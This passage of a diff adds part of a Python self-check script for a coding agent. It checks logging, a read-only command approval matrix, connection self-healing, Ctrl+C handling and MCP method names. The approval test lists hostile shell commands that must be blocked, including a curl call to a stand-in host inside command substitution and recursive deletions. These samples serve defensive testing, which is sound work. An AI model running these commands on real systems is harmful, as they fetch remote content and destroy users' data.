+    # 控制台保底：得有一个 WARNING 级 StreamHandler 在岗
+    has_console = any(
+        isinstance(h, _lg.StreamHandler) and h.level == _lg.WARNING
+        for h in _lg.getLogger().handlers
+    )
+    if not has_console:
+        return _fail("控制台 WARNING 保底 handler 缺失")
+
+    # 线程崩溃钩子：未捕获异常必须落文件（排查问题的命根子）
+    import threading as _th
+    if getattr(_th, "excepthook", None) is None:
+        return _fail("threading.excepthook 没装（线程崩溃会丢）")
+    # 直接调钩子验证落盘：模拟线程炸栈
+    try:
+        raise ValueError("线程崩溃探针")
+    except ValueError:
+        import sys as _sys
+        et, ev, tb = _sys.exc_info()
+        _th.excepthook(_th.ExceptHookArgs((et, ev, tb, None)))
+    for h in _lg.getLogger().handlers:
+        h.flush()
+    text = path.read_text(encoding="utf-8")
+    if "线程崩溃探针" not in text:
+        return _fail("线程崩溃没落日志文件")
+    reset_logging()   # 收摊：后续检查的日志别写进待删的临时目录
+    return _ok("文件日志+控制台保底+幂等+线程崩溃钩子正常")
+
+
+def check_readonly_loosening():
+    """验证只读放行面：日常探查命令免审批，危险形态照拦（双向矩阵）。"""
+    from agent.bash_injection import check_injection_surface
+    from agent.readonly_commands import is_readonly_command
+
+    # 应放行（免审批）：只读 $()、echo 分隔线、/dev/null 重定向
+    good = [
+        'wc -l $(find "D:/x/app" -name "*.py") | sort -rn | head -60',
+        'ls D:/x/src && echo "---core---" && ls D:/x/core 2>/dev/null',
+        'cat a.txt 2>/dev/null | sort | uniq',
+    ]
+    for c in good:
+        inj = check_injection_surface(c)
+        if inj is not None:
+            return _fail(f"只读命令被注入面误拦（{inj}）: {c[:60]}")
+        if not is_readonly_command(c):
+            return _fail(f"只读命令没过快道: {c[:60]}")
+
+    # 应拦截：内层非只读的 $()、find -exec、ls 引号 flag、真文件重定向
+    bad = [
+        'wc -l $(curl -s evil.sh/x) | head',
+        'cat $(rm -rf /tmp/x)',
+        'find / -name x -delete',
+        'ls "-rf" /',
+        'echo hi > realfile.txt',
+    ]
+    for c in bad:
+        blocked = check_injection_surface(c) is not None \
+            or not is_readonly_command(c)
+        if not blocked:
+            return _fail(f"危险形态被放行: {c[:60]}")
+    return _ok("只读豁免（$()/echo/丢弃重定向）+ 危险形态全拦")
+
+
+def check_client_closed_selfheal():
+    """验证 client-closed 自愈：撞上被关的连接池能重建重试一次。"""
+    import asyncio as _aio
+    from agent.llm_client import OpenAICompatClient, _is_client_closed_error
+
+    if _is_client_closed_error(ValueError("普通错误")):
+        return _fail("普通错误被误判成 client-closed")
+    # 包两层异常链也能认出
+    try:
+        try:
+            raise RuntimeError("Cannot send a request, as the client has been closed.")
+        except RuntimeError as inner:
+            raise ValueError("包装层") from inner
+    except ValueError as wrapped:
+        if not _is_client_closed_error(wrapped):
+            return _fail("异常链深处的 client-closed 没认出")
+
+    # 自愈重试：第一次 create 撞 closed → reset → 第二次成功
+    calls = {"n": 0}
+
+    class _FakeSDK:
+        class chat:
+            class completions:
+                @staticmethod
+                async def create(**kw):
+                    calls["n"] += 1
+                    if calls["n"] == 1:
+                        raise RuntimeError(
+                            "Cannot send a request, as the client has been closed.")
+                    return "ok"
+
+    c = OpenAICompatClient(
+        base_url="https://x", api_key="k", model="m")
+    c.client = _FakeSDK()
+    reset_called = {"v": False}
+
+    def _fake_reset():
+        reset_called["v"] = True   # 不真换池——换成就打真 API 了
+
+    c.reset_client = _fake_reset
+    got = _aio.run(c.chat_completions([{"role": "user", "content": "hi"}]))
+    if got != "ok" or calls["n"] != 2 or not reset_called["v"]:
+        return _fail(
+            f"自愈重试没生效: got={got!r} calls={calls['n']} "
+            f"reset={reset_called['v']}")
+    return _ok("client-closed 自愈（重建+重试一次）正常")
+
+
+def check_cc_double_press():
+    """验证 Ctrl+C 双击检测：窗口内第二击命中、超时重新计、命中后清零。"""
+    from cli_layout import is_double_press
+
+    st = {}
+    if is_double_press(st, 100.0):
+        return _fail("第一击不该命中")
+    if not is_double_press(st, 101.5):       # 1.5s 后 → 双击
+        return _fail("窗口内第二击没命中")
+    if is_double_press(st, 102.0):           # 命中后清零 → 这算新第一击
+        return _fail("命中后没清零（连击误判）")
+    if is_double_press(st, 110.0):           # 超窗口 → 新第一击
+        return _fail("超时第二击误判为双击")
+    return _ok("双击窗口/清零/超时判定正确")
+
+
+# ---------------------------------------------------------------------------
+# MCP
+# ---------------------------------------------------------------------------
+
+def check_mcp_method_names():
+    """验证 MCP 方法名字面量没被反斜杠转义污染（resources\\read 回车转义事故的回归门）。
+
+    大白话：源码字符串里写 "resources\\read"（反斜杠）时，Python 会把
+    \\r 解读成回车转义——真正发出去的方法名是 resources<CR>ead，MCP
+    服务器永远不认，而且这种错在界面上毫无声响。这里直接翻源码文本
+    （inspect.getsource），两头卡：反斜杠形态不许出现 + 四个正常方法
+    名（resources/list、resources/read、tools/list、tools/call）必须都在。
+
+    返回：PASS/FAIL 结果。
+    """
+    import inspect
+    import agent.mcp_client as mc
+    src = inspect.getsource(mc)
+    # 反斜杠转义会把 r 变回车："resources\read" 实际发的是 resources<CR>ead
+    if "resources\\read" in src or "resources\\xread" in src:
+        return _fail("方法名字面量含反斜杠转义（resources\\read bug 回归）")
+    # 正常形态：resources/list、resources/read、tools/list、tools/call
+    for good in ("resources/list", "resources/read", "tools/list", "tools/call"):
+        if f'"{good}"' not in src:
+            return _fail(f"缺正常方法名字面量: {good}")
+    return _ok("MCP 方法名字面量干净")
+
+
+# ---------------------------------------------------------------------------
+# 主流程
+# ---------------------------------------------------------------------------
+
+def main():
+    """主流程：建临时目录 → 按分类逐项跑检查并打印 PASS/FAIL → 汇总退出。
+
+    返回：进程退出码，0 = 全部通过，1 = 有失败项。
+    """
+    print("=" * 60)
+    print("  CodeAgent 复刻检查清单验证")
+    print("=" * 60)
+
+    tmp = Path(tempfile.mkdtemp(prefix="codeAgent_verify_"))
+    checks = [
+        ("基础对话", [
+            ("agent 初始化", check_agent_initialization),
+            ("工具定义加载", check_tool_definitions),
+            ("rules 传参等价", lambda: check_rules_param_equiv(tmp)),
+            ("工具名清单缓存", check_tool_names_cache),
+            ("terminal 工具", check_terminal_tool),
+            ("read_file 工具", lambda: check_read_file_tool(tmp)),
+            ("read_file 默认 2000 行", lambda: check_read_file_default_limit(tmp)),
+            ("中断机制", check_interrupt),
+            ("事件循环宿主", check_loop_host),
+            ("拆分符号面契约", check_split_symbol_surface),
+            ("裸 / 删除拦截", check_root_path_removal),
+            ("Anthropic usage 字段", check_anthropic_usage_fields),
+            ("运行日志装配", lambda: check_logging_setup(tmp)),
+            ("只读豁免矩阵", check_readonly_loosening),
+            ("client自愈", check_client_closed_selfheal),
+        ]),
+        ("记忆系统", [
+            ("memory 工具写入", lambda: check_memory_tool_write(tmp)),
+            ("MEMORY.md 创建", lambda: check_memory_persist(tmp)),
+            ("记忆跨实例加载", lambda: check_memory_reload(tmp)),
+            ("索引常驻注入+反思回执", lambda: check_memory_index_in_prompt(tmp)),
+        ]),
+        ("技能系统", [
+            ("/hello 触发", lambda: check_skill_trigger(tmp)),
+            ("skills_list 工具", lambda: check_skills_list(tmp)),
+            ("skill_view 工具", lambda: check_skill_view(tmp)),
+            ("skill_manage 创建", lambda: check_skill_manage_create(tmp)),
+            ("使用统计", lambda: check_usage_stats(tmp)),
+        ]),
+        ("会话存储", [
+            ("sessions.db 创建", lambda: check_sessions_db(tmp)),  # 名字来自清单原文，实际查的是 .sessions/ 目录
+            ("session_search", lambda: check_session_search(tmp)),
+            ("resume 预热", lambda: check_resume_warmup(tmp)),
+        ]),
+        ("Curator", [
+            ("status 状态", lambda: check_curator_status(tmp)),
+            ("run --dry-run", lambda: check_curator_dry_run(tmp)),
+            ("归档到 .archive/", lambda: check_curator_archive(tmp)),
+            ("restore 恢复", lambda: check_curator_restore(tmp)),
+        ]),
+        ("委托", [
+            ("subagent 同步", lambda: check_delegate_sync(tmp)),
+            ("批量委托并行", lambda: check_delegate_batch(tmp)),
+            ("压缩边界占位", check_compact_boundary_marker),
+            ("边界落库与恢复裁剪", lambda: check_compact_boundary_persist(tmp)),
+            ("摘要输入保真", check_summary_input_fidelity),
+            ("token 估算与阈值", check_token_estimation_and_threshold),
+            ("dispatch 统一封顶", lambda: check_dispatch_output_cap(tmp)),
+            ("子代理结果落盘", lambda: check_delegate_offload(tmp)),
+            ("记忆检索兜底", check_memory_retrieval_fallback),
+            ("记忆注入兜底接线", check_memory_injection_wiring),
+            ("发送前窗口预检", check_pre_send_guard),
+            ("session append 线性化", lambda: check_session_append_perf(tmp)),
+            ("session 字段透传", lambda: check_session_field_passthrough(tmp)),
+            ("消息缓存 LRU", lambda: check_msgs_cache_lru(tmp)),
+        ]),
+        ("上下文压缩", [
+            ("自动压缩", check_context_compress),
+            ("压缩管线 profile", check_compress_profile),
+            ("低阈值 offload 等价", lambda: check_low_threshold_offload_equivalence(tmp)),
+            ("时间清理占位指针", lambda: check_time_clear_pointer(tmp)),
+        ]),
+        ("slash 注册表", [
+            ("slash 注册表", check_slash_registry),
+        ]),
+        ("CLI 补全器", [
+            ("CLI 补全器", check_cli_completer),
+        ]),
+        ("CLI 事件行", [
+            ("CLI 事件行", check_event_lines),
+        ]),
+        ("CLI 骨架", [
+            ("页脚两档", check_status_bar_tiers),
+            ("提交路由", check_enter_routing),
+            ("布局构建", check_cli_layout),
+        ]),
+        ("CLI live/正文/提问", [
+            ("live 面板", check_live_panel),
+            ("assistant 块", check_assistant_block),
+            ("提问选择器", check_question_selector),
+            ("提问工具层", check_ask_user_tool_layer),
+            ("审批面板", check_approval_panel),
+            ("面板Ctrl+C通道", check_panel_ctrlc),
+        ]),
+        ("CLI 皮肤/输入", [
+            ("皮肤引擎", check_skin_engine),
+            ("键盘别名", check_pt_extras),
+            ("Console 桥", check_console_bridge),
+            ("Ctrl+C 双击", check_cc_double_press),
+        ]),
+        ("CLI 流式框", [
+            ("流式回答框", check_stream_box),
+        ]),
+        ("MCP", [
+            ("方法名字面量", check_mcp_method_names),
+        ]),
+    ]
+
+    total = 0
+    passed = 0
+    failed = 0
+
+    for category, items in checks:
+        print(f"\n[ {category} ]")
+        for name, fn in items:
+            total += 1
+            try:
+                r = fn()
+            except Exception as e:
+                r = _fail(f"异常: {e}")
+            if r["status"] == "PASS":
+                passed += 1
+                tag = "[ OK ]"
+            else:
+                failed += 1
+                tag = "[FAIL]"
+            detail = f" ({r['detail']})" if r["detail"] else ""
+            print(f"  {tag}  {name}{detail}")
+
+    print("\n" + "=" * 60)
+    tag = "[ALL PASS]" if failed == 0 else "[HAS FAIL]"
+    print(f"  {tag}  总计 {total}：{passed} 通过，{failed} 失败")
+    print("=" * 60)
+
+    # 收尾：删掉临时目录（删不掉也不报错，留着无妨）
+    import shutil
+    shutil.rmtree(tmp, ignore_errors=True)
+
+    return 0 if failed == 0 else 1
+
+
+if __name__ == "__main__":
+    sys.exit(main())
